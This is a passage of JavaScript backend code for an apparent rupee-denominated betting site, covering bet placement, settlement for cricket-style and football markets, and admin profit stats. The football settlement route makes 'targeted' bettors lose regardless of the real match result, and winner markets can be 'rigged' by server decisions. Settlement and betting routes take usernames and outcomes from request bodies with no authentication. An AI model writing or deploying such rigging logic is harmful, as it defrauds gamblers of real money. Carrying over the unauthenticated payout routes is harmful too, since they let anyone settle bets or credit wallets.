// up from the server's own /decide-match record for that match — the caller-supplied `won` is only
// ever used as a fallback for the rare case no decision was recorded, never as the primary source for
// the market that's actually eligible for rigging. Every other (prop) market still trusts the
// client's own resolution of its ball-by-ball simulation (unchanged — never part of the rig feature),
// but payout is always computed from this bet's own stored odds, never a caller-supplied multiplier.
app.post('/api/boundarybaazi/settle', async (req, res) => {
  const { bet_id, won: clientWon } = req.body;
  if (!bet_id) return res.status(400).json({ error: 'bet_id required.' });
  try {
    const gameBet = await prisma.gameBet.findUnique({ where: { id: bet_id } });
    if (!gameBet || gameBet.status !== 'active') return res.status(400).json({ error: 'Bet not found or already settled.' });

    const meta = gameBet.metadata || {};
    let won = !!clientWon;
    let was_rigged = false;
    let push = false;

    if (meta.bet_type === 'winner' && meta.match_id && BOUNDARY_MATCH_DECISIONS[meta.match_id]) {
      const decision = BOUNDARY_MATCH_DECISIONS[meta.match_id];
      if (decision.winner === 'tie') {
        push = true;
      } else {
        won = decision.winner === meta.selection;
      }
      was_rigged = decision.was_rigged;
    }

    const odds = parseFloat(meta.odds) || 2.0;
    const payout = push ? gameBet.bet_amount : (won ? gameBet.bet_amount * odds : 0);
    const status = push ? 'push' : (won ? 'won' : 'lost');

    await prisma.gameBet.update({
      where: { id: bet_id },
      data: { status, payout, settled_at: new Date(), metadata: { ...meta, was_rigged } }
    });

    let balance = null;
    const user = await prisma.user.findFirst({ where: { username: { equals: gameBet.username, mode: 'insensitive' } } });
    if (payout > 0 && user) {
      const updated = await prisma.user.update({ where: { id: user.id }, data: { wallet_balance: { increment: payout } } });
      balance = updated.wallet_balance;
      await prisma.transaction.create({
        data: {
          id: 'BB_WIN_' + Date.now(),
          user: gameBet.username, type: 'Deposit', amount: payout,
          details: push ? `Boundary Baazi Push — Refund` : `Boundary Baazi Win — ${odds}x`,
          status: 'Completed'
        }
      });
    } else if (user) {
      balance = user.wallet_balance;
    }
    res.json({ success: true, payout, status, was_rigged, balance });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ========================================================================
// FOOTBALL — MATCH BETTING BACKEND
// ========================================================================

// POST /api/football/place-bet & /api/bets — Place football match bets (single or parlay)
app.post(['/api/football/place-bet', '/api/bets'], async (req, res) => {
  const username = req.body.username || req.body.user || 'DemoUser';
  const betType = req.body.bet_type || 'single';
  const stake = parseFloat(req.body.stake || req.body.bet_amount || 0);
  const legs = Array.isArray(req.body.legs) ? req.body.legs : [];

  if (isNaN(stake) || stake <= 0) {
    return res.status(400).json({ error: 'Invalid stake amount.' });
  }

  try {
    const user = await getOrCreateUser(username);
    const totalCost = betType === 'single' ? (stake * Math.max(1, legs.length)) : stake;

    if (user.wallet_balance < totalCost) {
      return res.status(400).json({ error: `Insufficient balance! Need ₹${totalCost.toFixed(2)}, have ₹${user.wallet_balance.toFixed(2)}.` });
    }
    markUserActive('football', username);

    await prisma.user.update({
      where: { id: user.id },
      data: { wallet_balance: { decrement: totalCost } }
    });

    const placedBets = [];
    if (betType === 'single' && legs.length > 0) {
      for (const pick of legs) {
        const betId = 'FB' + Math.floor(1000 + Math.random() * 9000);
        const odds = parseFloat(pick.odds) || 2.0;
        await prisma.transaction.create({
          data: {
            id: 'TX_' + Date.now() + '_' + betId,
            user: username,
            type: 'Withdrawal',
            amount: stake,
            details: `Football Single Bet: ${pick.match_label || ''} (${pick.label || ''}) @ ${odds}x`,
            status: 'Completed'
          }
        });

        await prisma.gameBet.create({
          data: {
            id: betId,
            username,
            game: 'football',
            bet_amount: stake,
            status: 'active',
            metadata: { type: 'single', legs: [pick], total_odds: odds, match_id: pick.match_id, selection: pick.selection }
          }
        });

        placedBets.push({
          id: betId,
          type: 'single',
          timestamp: new Date().toISOString(),
          stake,
          total_odds: odds,
          potential_payout: parseFloat((stake * odds).toFixed(2)),
          status: 'pending',
          legs: [{ ...pick, result: 'pending' }]
        });
      }
    } else {
      const betId = 'FB' + Math.floor(1000 + Math.random() * 9000);
      const totalOdds = legs.length > 0 ? legs.reduce((acc, p) => acc * (parseFloat(p.odds) || 1.0), 1.0) : (parseFloat(req.body.odds) || 2.0);
      const roundedOdds = parseFloat(totalOdds.toFixed(2));

      await prisma.transaction.create({
        data: {
          id: 'TX_' + Date.now() + '_' + betId,
          user: username,
          type: 'Withdrawal',
          amount: totalCost,
          details: `Football Accumulator Parlay Bet (${legs.length} legs) @ ${roundedOdds}x`,
          status: 'Completed'
        }
      });

      await prisma.gameBet.create({
        data: {
          id: betId,
          username,
          game: 'football',
          bet_amount: totalCost,
          status: 'active',
          metadata: { type: betType, legs, total_odds: roundedOdds }
        }
      });

      placedBets.push({
        id: betId,
        type: betType,
        timestamp: new Date().toISOString(),
        stake: totalCost,
        total_odds: roundedOdds,
        potential_payout: parseFloat((totalCost * roundedOdds).toFixed(2)),
        status: 'pending',
        legs: legs.map(l => ({ ...l, result: 'pending' }))
      });
    }

    const updatedUser = await prisma.user.findUnique({ where: { id: user.id } });
    res.json({
      success: true,
      bets_placed: placedBets.length,
      bets: placedBets,
      new_balance: updatedUser.wallet_balance
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/football/settle — Settle football match bets
app.post('/api/football/settle', async (req, res) => {
  const { match_id, winning_selection } = req.body;
  if (!match_id || !winning_selection) return res.status(400).json({ error: 'match_id and winning_selection required.' });
  try {
    const activeBets = await prisma.gameBet.findMany({
      where: { game: 'football', status: 'active' }
    });

    const matchBets = activeBets.filter(b => b.metadata && b.metadata.match_id === match_id);
    let settledCount = 0;
    const botActive = isBotTakeoverActive('football').active;
    const results = [];

    for (const bet of matchBets) {
      const naturallyWon = bet.metadata.selection === winning_selection;
      // A currently live-targeted bettor loses regardless of the true match result; everyone else
      // gets the real outcome.
      const wasTargeted = botActive && isUserTargeted('football', bet.username);
      const won = wasTargeted ? false : naturallyWon;
      const odds = bet.metadata.odds || 2.0;
      const payout = won ? bet.bet_amount * odds : 0;

      await prisma.gameBet.update({
        where: { id: bet.id },
        data: { status: won ? 'won' : 'lost', payout, settled_at: new Date(), metadata: { ...bet.metadata, was_rigged: wasTargeted } }
      });

      if (won && payout > 0) {
        const user = await prisma.user.findFirst({ where: { username: { equals: bet.username, mode: 'insensitive' } } });
        if (user) {
          await prisma.user.update({ where: { id: user.id }, data: { wallet_balance: { increment: payout } } });
          await prisma.transaction.create({
            data: {
              id: 'FB_WIN_' + Date.now() + '_' + settledCount,
              user: bet.username, type: 'Deposit', amount: payout,
              details: `Football Win — Match ${match_id}: ${winning_selection} @ ${odds}x`,
              status: 'Completed'
            }
          });
        }
      }
      results.push({ bet_id: bet.id, username: bet.username, won, was_rigged: wasTargeted });
      settledCount++;
    }
    res.json({ success: true, settled_count: settledCount, results });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/football/active-bets — Get user's active football bets
app.get('/api/football/active-bets', async (req, res) => {
  const username = req.query.username || 'DemoUser';
  try {
    const bets = await prisma.gameBet.findMany({
      where: { username: { equals: username, mode: 'insensitive' }, game: 'football', status: 'active' },
      orderBy: { created_at: 'desc' }
    });
    res.json({ success: true, bets });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ========================================================================
// ADMIN — UNIFIED GAME STATS (ALL REAL DATA)
// ========================================================================

// GET /api/admin/game-stats — Aggregate stats for all games
app.get('/api/admin/game-stats', async (req, res) => {
  try {
    const games = ['mines', 'cricket', 'football', 'boundarybaazi'];
    const stats = {};
    for (const game of games) {
      const total = await prisma.gameBet.count({ where: { game } });
      const active = await prisma.gameBet.count({ where: { game, status: 'active' } });
      const won = await prisma.gameBet.count({ where: { game, status: 'won' } });
      const lost = await prisma.gameBet.count({ where: { game, status: 'lost' } });
      const allBets = await prisma.gameBet.findMany({ where: { game } });
      const totalWagered = allBets.reduce((sum, b) => sum + b.bet_amount, 0);
      const totalPayout = allBets.reduce((sum, b) => sum + b.payout, 0);
      stats[game] = { total, active, won, lost, total_wagered: totalWagered, total_payout: totalPayout, house_profit: totalWagered - totalPayout };
    }
    res.json({ success: true, stats });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Serve static frontend assets for non-API routes
app.use(express.static(path.join(__dirname, '..')));

if (require.main === module) {
  app.listen(PORT, () => {
    console.log(`[bet1x-backend] Express backend listening on port ${PORT}`);
  });
}

module.exports = app;
